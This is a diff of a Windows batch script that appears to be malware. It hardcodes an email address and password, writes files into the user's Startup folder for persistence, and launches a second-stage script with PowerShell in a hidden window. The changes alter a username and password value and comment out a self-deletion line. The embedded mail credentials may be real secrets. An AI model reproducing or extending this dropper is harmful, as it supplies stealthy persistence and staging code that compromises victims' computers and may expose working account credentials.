@@ -3,8 +3,8 @@
 REM Custom
 SET email=blabla.97@internet.ru
 SET emailp=NoShitSherlock1036!
-SET user=help
-SET p=help
+SET user=helpb
+SET p=helpb
 
 SET stage_path="C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
 SET init_path=%cd%
@@ -20,4 +20,4 @@ echo %p% > %stage_path%/f4EWj29Hgq.txt
 powershell -c "Start-Process -FilePath '%stage_path%\sec_stage.cmd' -WindowStyle Hidden"
 
 cd %init_path%
-DEL %0
+#DEL %0
